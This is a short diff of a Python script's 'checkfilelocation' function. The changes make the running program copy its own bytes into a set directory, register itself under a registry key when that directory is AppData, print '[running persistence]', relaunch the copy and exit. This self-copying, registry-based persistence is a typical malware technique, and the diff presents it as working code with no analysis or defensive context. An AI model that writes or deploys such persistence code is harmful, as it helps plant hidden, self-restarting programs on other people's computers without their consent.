@@ -60,16 +60,18 @@ def checkfilelocation():
     
             current_dir = os.getcwd()
             if current_dir != Directory:
-                curr = open(sys.argv[0])
+                curr = open(sys.argv[0],'rb')
                 cont = curr.read()
                 curr.close()
-                f = open(Directory+"//"+sys.argv[0],'w')
+                f = open(Directory+"\\"+APPNAME,'wb')
                 f.write(cont)
                 f.close()
+                sleep(10)
+                print("[running persistence]")
                 if Directory == APPDATADIR:
                     print("True")
-                    persistencebyregkey(NAMEOFREGKEY,Directory+"\\"+sys.argv[0])
-                os.startfile(Directory+"//"+sys.argv[0])
+                    persistencebyregkey(NAMEOFREGKEY,Directory+"\\"+APPNAME)
+                os.startfile(Directory+"\\"+APPNAME)
                 sys.exit()
 
 
